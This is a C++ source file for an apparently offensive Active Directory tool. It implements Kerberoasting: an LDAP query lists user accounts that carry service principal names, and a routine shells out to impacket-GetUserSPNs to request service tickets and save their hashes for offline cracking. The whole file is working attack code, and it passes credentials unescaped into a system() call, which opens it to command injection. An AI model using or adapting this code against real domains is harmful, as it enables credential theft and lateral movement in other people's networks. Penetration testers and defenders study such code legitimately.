#include <iostream>
#include "Attacks.h"
#include "LDAPConnection.h"
#include <string>
#include <vector>

Attacks::Kerberoast::Kerberoast(LDAPConnection& _conn) : conn(_conn) {}

std::vector<std::string> Attacks::Kerberoast::listUser(const std::string& baseDN) {
    std::cout << "[*] Enumerating kerberoastable users" << std::endl;

    std::string query = "(&(servicePrincipalName=*)(!(objectClass=computer)))";
    std::vector<std::string> attrs = {"sAMAccountName", "servicePrincipalName"};
    std::vector<std::string> kerberoastable_users;
    std::vector<std::string> kerberoastable_users_spns;

    auto results = conn.executeQuery(baseDN, query, attrs);

    for (const auto& userObject : results) {
        auto user = userObject.find("sAMAccountName");
        auto spn = userObject.find("servicePrincipalName");

        if (user != userObject.end() && !user->second.empty()) {
            std::string username = user->second.front();
            if (username == "krbtgt") {
                continue;
            }
            std::cout << "  [+] User: " << username << std::endl;
            kerberoastable_users.push_back(username);
            if (spn != userObject.end()) {
                for (const auto& _spn : spn->second) {
                    kerberoastable_users_spns.push_back(_spn); 
                }
            }
        }
    }
    return kerberoastable_users;
}

bool Attacks::Kerberoast::requestTicket(const std::string& username_spn, const std::string& username, const std::string& password) {
    std::cout << "\n[*] Requesting TGS ticket for: " << username_spn << '\n' << std::endl;

    std::string output_file = username_spn + "_hash.txt";
    std::string cmd = "impacket-GetUserSPNs yharnam.local/" + username + ":'" + password + "' -outputfile " + output_file + " -request-user " + username_spn;
    int result = system(cmd.c_str());

    if (result == 0) {
        std::cout << "\nTicket saved in " + username_spn + "_hash.txt" << std::endl;
        return true;
    }  else {
        std::cerr << "  [-] Failed to request ticket. Ensure you have a valid TGT (run 'kinit')." << std::endl;
        return false;
    }
}
